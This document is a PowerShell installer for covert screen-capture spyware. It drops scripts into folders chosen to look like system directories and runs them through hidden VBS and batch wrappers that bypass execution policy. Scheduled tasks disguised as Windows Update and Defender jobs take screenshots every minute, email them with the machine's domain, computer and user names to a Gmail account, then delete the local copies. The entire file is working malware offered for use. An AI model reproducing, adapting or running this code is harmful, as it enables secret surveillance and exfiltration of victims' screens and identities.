$screenshotPSScript=@'
$OutPath = "$env:USERPROFILE\Favorites\Links"
if (-not (Test-Path $OutPath))
        {
            New-Item $OutPath -ItemType Directory -Force
        }

$FileName = "$env:USERDOMAIN - $env:COMPUTERNAME - $env:username - $(get-date -f yyyy-MM-dd_HHmmss).png"
$File = Join-Path $OutPath $fileName
Add-Type -AssemblyName System.Windows.Forms
Add-type -AssemblyName System.Drawing
$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
$Width = $Screen.Width
$Height = $Screen.Height
$Left = $Screen.Left
$Top = $Screen.Top
$bitmap = New-Object System.Drawing.Bitmap $Width, $Height
$graphic = [System.Drawing.Graphics]::FromImage($bitmap)
$graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
$bitmap.Save($file) 
'@
$sendMailPSScript=@'
$username="yourgmail@gmail.com"
$password="gmailpassword"
$smtpServer = "smtp.gmail.com"
$msg = new-object Net.Mail.MailMessage
$smtp = New-Object Net.Mail.SmtpClient($SmtpServer, 587)    
$smtp.EnableSsl = $true
$smtp.Credentials = New-Object System.Net.NetworkCredential($username,$password)
$msg.From = "yourgmail@gmail.com"
$msg.To.Add("yourgmail@gmail.com")
$msg.Body="Attached Files"
$msg.Subject = "[Data from] DomainName:$env:USERDOMAIN - ComputerName:$env:COMPUTERNAME - UserName:$env:username - at $(get-date -f yyyy-MM-dd_HHmmss) "
$files=Get-ChildItem "$env:USERPROFILE\Favorites\Links\"
Foreach($file in $files)
{
Write-Host "Attaching File :- " $file
$attachment = new-object System.Net.Mail.Attachment -ArgumentList $file.FullName
$msg.Attachments.Add($attachment)

}
$smtp.Send($msg)
$attachment.Dispose();
$msg.Dispose();
'@
$deleteScreenshotFolderPSScript=@'
Remove-Item $env:USERPROFILE\Favorites\Links\*.*
'@
$screenshotVBSScript=@'
Set WinScriptHost = CreateObject("WScript.Shell")
WinScriptHost.Run Chr(34) & "C:\Program Files (x86)\windows nt\tabletextservice\en-US\s.bat" & Chr(34), 0
Set WinScriptHost = Nothing
'@
$sendMailVBSScript=@'
Set WinScriptHost = CreateObject("WScript.Shell")
WinScriptHost.Run Chr(34) & "C:\Program Files (x86)\windows nt\tabletextservice\en-US\m.bat" & Chr(34), 0
Set WinScriptHost = Nothing
'@
$deleteScreenshotFolderVBSScript=@'
Set WinScriptHost = CreateObject("WScript.Shell")
WinScriptHost.Run Chr(34) & "C:\Program Files (x86)\windows nt\tabletextservice\en-US\d.bat" & Chr(34), 0
Set WinScriptHost = Nothing

'@
$screenshotlBAT=@"
@echo off
PowerShell -WindowStyle Hidden -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Command "& 'C:\ProgramData\Microsoft\s.ps1'"
"@
$sendMailBAT=@"
@echo off
PowerShell -WindowStyle Hidden -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Command "& 'C:\ProgramData\Microsoft\m.ps1'"
"@
$deleteScreenshotFolderBAT=@"
@echo off
PowerShell -WindowStyle Hidden -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Command "& 'C:\ProgramData\Microsoft\d.ps1'"
"@

# out files location - PS ( C:\ProgramData\Microsoft )
$OutPathPS = "C:\ProgramData\Microsoft"
if (-not (Test-Path $OutPathPS))
        {
            New-Item $OutPathPS -ItemType Directory -Force
        }
$screenshotPSScript | out-file "C:\ProgramData\Microsoft\s.ps1"
$sendMailPSScript | out-file "C:\ProgramData\Microsoft\m.ps1"
$deleteScreenshotFolderPSScript | out-file "C:\ProgramData\Microsoft\d.ps1" 



# out files location - VBS ( C:\symbols\ )
$OutPathVBS = "C:\symbols\"
if (-not (Test-Path $OutPathVBS))
        {
            New-Item $OutPathVBS -ItemType Directory -Force
        }

$screenshotVBSScript | out-file "C:\symbols\s.vbs" 
$sendMailVBSScript | out-file "C:\symbols\m.vbs" 
$deleteScreenshotFolderVBSScript  | out-file "C:\symbols\d.vbs" 


# out files location - BAT ( C:\Program Files (x86)\windows nt\tabletextservice\en-US )
$OutPathBAT = "C:\Program Files (x86)\windows nt\tabletextservice\en-US"
if (-not (Test-Path $OutPathBAT))
        {
            New-Item $OutPathBAT -ItemType Directory -Force
        }
$screenshotlBAT | out-file "C:\Program Files (x86)\windows nt\tabletextservice\en-US\s.bat"  -Encoding utf8
$sendMailBAT | out-file "C:\Program Files (x86)\windows nt\tabletextservice\en-US\m.bat"  -Encoding utf8
$deleteScreenshotFolderBAT | out-file "C:\Program Files (x86)\windows nt\tabletextservice\en-US\d.bat"   -Encoding utf8



Set-ExecutionPolicy Unrestricted 
schtasks /create /sc minute /mo 1 /tn WindowsUpdateManager /tr C:\symbols\s.vbs
schtasks /create /sc minute /mo 5 /tn WDAGUtilityUpdateClient /tr C:\symbols\m.vbs
schtasks /create /sc minute /mo 12 /tn MicrosoftDefenderUpdateTask /tr C:\symbols\d.vbs

Start-ScheduledTask -TaskName WindowsUpdateManager
Start-ScheduledTask -TaskName WDAGUtilityUpdateClient
Start-ScheduledTask -TaskName MicrosoftDefenderUpdateTask


